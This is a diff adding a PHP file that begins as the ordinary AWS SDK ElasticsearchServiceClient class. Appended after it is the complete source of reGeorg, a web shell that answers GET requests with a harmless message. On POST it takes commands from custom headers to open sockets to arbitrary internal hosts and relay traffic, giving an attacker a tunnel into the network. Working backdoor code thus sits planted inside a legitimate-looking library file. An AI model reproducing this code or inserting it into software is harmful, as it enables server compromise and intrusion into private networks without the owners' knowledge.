@@ -1,0 +1,283 @@
+<?php
+namespace Aws\ElasticsearchService;
+
+use Aws\AwsClient;
+
+/**
+ * This client is used to interact with the **Amazon Elasticsearch Service** service.
+ *
+ * @method \Aws\Result acceptInboundCrossClusterSearchConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise acceptInboundCrossClusterSearchConnectionAsync(array $args = [])
+ * @method \Aws\Result addTags(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise addTagsAsync(array $args = [])
+ * @method \Aws\Result associatePackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise associatePackageAsync(array $args = [])
+ * @method \Aws\Result cancelElasticsearchServiceSoftwareUpdate(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise cancelElasticsearchServiceSoftwareUpdateAsync(array $args = [])
+ * @method \Aws\Result createElasticsearchDomain(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createElasticsearchDomainAsync(array $args = [])
+ * @method \Aws\Result createOutboundCrossClusterSearchConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createOutboundCrossClusterSearchConnectionAsync(array $args = [])
+ * @method \Aws\Result createPackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise createPackageAsync(array $args = [])
+ * @method \Aws\Result deleteElasticsearchDomain(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteElasticsearchDomainAsync(array $args = [])
+ * @method \Aws\Result deleteElasticsearchServiceRole(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteElasticsearchServiceRoleAsync(array $args = [])
+ * @method \Aws\Result deleteInboundCrossClusterSearchConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteInboundCrossClusterSearchConnectionAsync(array $args = [])
+ * @method \Aws\Result deleteOutboundCrossClusterSearchConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deleteOutboundCrossClusterSearchConnectionAsync(array $args = [])
+ * @method \Aws\Result deletePackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise deletePackageAsync(array $args = [])
+ * @method \Aws\Result describeDomainAutoTunes(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeDomainAutoTunesAsync(array $args = [])
+ * @method \Aws\Result describeElasticsearchDomain(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeElasticsearchDomainAsync(array $args = [])
+ * @method \Aws\Result describeElasticsearchDomainConfig(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeElasticsearchDomainConfigAsync(array $args = [])
+ * @method \Aws\Result describeElasticsearchDomains(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeElasticsearchDomainsAsync(array $args = [])
+ * @method \Aws\Result describeElasticsearchInstanceTypeLimits(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeElasticsearchInstanceTypeLimitsAsync(array $args = [])
+ * @method \Aws\Result describeInboundCrossClusterSearchConnections(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeInboundCrossClusterSearchConnectionsAsync(array $args = [])
+ * @method \Aws\Result describeOutboundCrossClusterSearchConnections(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeOutboundCrossClusterSearchConnectionsAsync(array $args = [])
+ * @method \Aws\Result describePackages(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describePackagesAsync(array $args = [])
+ * @method \Aws\Result describeReservedElasticsearchInstanceOfferings(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeReservedElasticsearchInstanceOfferingsAsync(array $args = [])
+ * @method \Aws\Result describeReservedElasticsearchInstances(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise describeReservedElasticsearchInstancesAsync(array $args = [])
+ * @method \Aws\Result dissociatePackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise dissociatePackageAsync(array $args = [])
+ * @method \Aws\Result getCompatibleElasticsearchVersions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getCompatibleElasticsearchVersionsAsync(array $args = [])
+ * @method \Aws\Result getPackageVersionHistory(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getPackageVersionHistoryAsync(array $args = [])
+ * @method \Aws\Result getUpgradeHistory(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getUpgradeHistoryAsync(array $args = [])
+ * @method \Aws\Result getUpgradeStatus(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise getUpgradeStatusAsync(array $args = [])
+ * @method \Aws\Result listDomainNames(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listDomainNamesAsync(array $args = [])
+ * @method \Aws\Result listDomainsForPackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listDomainsForPackageAsync(array $args = [])
+ * @method \Aws\Result listElasticsearchInstanceTypes(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listElasticsearchInstanceTypesAsync(array $args = [])
+ * @method \Aws\Result listElasticsearchVersions(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listElasticsearchVersionsAsync(array $args = [])
+ * @method \Aws\Result listPackagesForDomain(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listPackagesForDomainAsync(array $args = [])
+ * @method \Aws\Result listTags(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise listTagsAsync(array $args = [])
+ * @method \Aws\Result purchaseReservedElasticsearchInstanceOffering(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise purchaseReservedElasticsearchInstanceOfferingAsync(array $args = [])
+ * @method \Aws\Result rejectInboundCrossClusterSearchConnection(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise rejectInboundCrossClusterSearchConnectionAsync(array $args = [])
+ * @method \Aws\Result removeTags(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise removeTagsAsync(array $args = [])
+ * @method \Aws\Result startElasticsearchServiceSoftwareUpdate(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise startElasticsearchServiceSoftwareUpdateAsync(array $args = [])
+ * @method \Aws\Result updateElasticsearchDomainConfig(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updateElasticsearchDomainConfigAsync(array $args = [])
+ * @method \Aws\Result updatePackage(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise updatePackageAsync(array $args = [])
+ * @method \Aws\Result upgradeElasticsearchDomain(array $args = [])
+ * @method \GuzzleHttp\Promise\Promise upgradeElasticsearchDomainAsync(array $args = [])
+ */
+class ElasticsearchServiceClient extends AwsClient {}
+<?php
+/*                   _____                                    
+   ____   ______  __|___  |__  ______  _____  _____   ______  
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______| 
+                    |_____|
+                    ... every office needs a tool like Georg
+                    
+  willem@sensepost.com / @_w_m__
+  sam@sensepost.com / @trowalts
+  etienne@sensepost.com / @kamp_staaldraad
+
+Legal Disclaimer
+Usage of reGeorg for attacking networks without consent
+can be considered as illegal activity. The authors of
+reGeorg assume no liability or responsibility for any
+misuse or damage caused by this program.
+
+If you find reGeorge on one of your servers you should
+consider the server compromised and likely further compromise
+to exist within your internal network.
+
+For more information, see:
+https://github.com/sensepost/reGeorg
+*/
+
+ini_set("allow_url_fopen", true);
+ini_set("allow_url_include", true);
+
+if( !function_exists('apache_request_headers') ) {
+    function apache_request_headers() {
+        $arh = array();
+        $rx_http = '/\AHTTP_/';
+
+        foreach($_SERVER as $key => $val) {
+            if( preg_match($rx_http, $key) ) {
+                $arh_key = preg_replace($rx_http, '', $key);
+                $rx_matches = array();
+                $rx_matches = explode('_', $arh_key);
+                if( count($rx_matches) > 0 and strlen($arh_key) > 2 ) {
+                    foreach($rx_matches as $ak_key => $ak_val) {
+                        $rx_matches[$ak_key] = ucfirst($ak_val);
+                    }
+
+                    $arh_key = implode('-', $rx_matches);
+                }
+                $arh[$arh_key] = $val;
+            }
+        }
+        return( $arh );
+    }
+}
+if ($_SERVER['REQUEST_METHOD'] === 'GET')
+{
+    exit("Georg says, 'All seems fine'");
+}
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+	set_time_limit(0);
+	$headers=apache_request_headers();
+	$cmd = $headers["X-CMD"];
+    switch($cmd){
+		case "CONNECT":
+			{
+				$target = $headers["X-TARGET"];
+				$port = (int)$headers["X-PORT"];
+				$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
+				if ($sock === false) 
+				{	
+					header('X-STATUS: FAIL');
+					header('X-ERROR: Failed creating socket');
+					return;
+				}
+				$res = @socket_connect($sock, $target, $port);
+                if ($res === false) 
+				{ 
+					header('X-STATUS: FAIL');
+					header('X-ERROR: Failed connecting to target');
+					return;
+				}
+				socket_set_nonblock($sock);	
+				@session_start();
+				$_SESSION["run"] = true;
+                $_SESSION["writebuf"] = "";
+                $_SESSION["readbuf"] = "";
+                ob_end_clean();
+                header('X-STATUS: OK');
+                header("Connection: close");
+                ignore_user_abort();
+                ob_start();
+                $size = ob_get_length();
+                header("Content-Length: $size");
+                ob_end_flush();
+                flush();            
+				session_write_close();
+                
+				while ($_SESSION["run"])
+				{
+					$readBuff = "";
+					@session_start();
+					$writeBuff = $_SESSION["writebuf"];
+					$_SESSION["writebuf"] = "";
+					session_write_close();
+                    if ($writeBuff != "")
+					{
+						$i = socket_write($sock, $writeBuff, strlen($writeBuff));
+						if($i === false)
+						{ 
+							@session_start();
+                            $_SESSION["run"] = false;
+                            session_write_close();
+                            header('X-STATUS: FAIL');
+							header('X-ERROR: Failed writing socket');
+						}
+					}
+					while ($o = socket_read($sock, 512)) {
+					if($o === false)
+						{ 
+                            @session_start();
+                            $_SESSION["run"] = false;
+                            session_write_close();
+							header('X-STATUS: FAIL');
+							header('X-ERROR: Failed reading from socket');
+						}
+						$readBuff .= $o;
+					}
+                    if ($readBuff!=""){
+                        @session_start();
+                        $_SESSION["readbuf"] .= $readBuff;
+                        session_write_close();
+                    }
+                    #sleep(0.2);
+				}
+                socket_close($sock);
+			}
+			break;
+		case "DISCONNECT":
+			{
+                error_log("DISCONNECT recieved");
+				@session_start();
+				$_SESSION["run"] = false;
+				session_write_close();
+				return;
+			}
+			break;
+		case "READ":
+			{
+				@session_start();
+				$readBuffer = $_SESSION["readbuf"];
+                $_SESSION["readbuf"]="";
+                $running = $_SESSION["run"];
+				session_write_close();
+                if ($running) {
+					header('X-STATUS: OK');
+                    header("Connection: Keep-Alive");
+					echo $readBuffer;
+					return;
+				} else {
+                    header('X-STATUS: FAIL');
+                    header('X-ERROR: RemoteSocket read filed');
+					return;
+				}
+			}
+			break;
+		case "FORWARD":
+			{
+                @session_start();
+                $running = $_SESSION["run"];
+				session_write_close();
+                if(!$running){
+                    header('X-STATUS: FAIL');
+					header('X-ERROR: No more running, close now');
+                    return;
+                }
+                header('Content-Type: application/octet-stream');
+				$rawPostData = file_get_contents("php://input");
+				if ($rawPostData) {
+					@session_start();
+					$_SESSION["writebuf"] .= $rawPostData;
+					session_write_close();
+					header('X-STATUS: OK');
+                    header("Connection: Keep-Alive");
+					return;
+				} else {
+					header('X-STATUS: FAIL');
+					header('X-ERROR: POST request read filed');
+				}
+			}
+			break;
+	}
+}
+?>
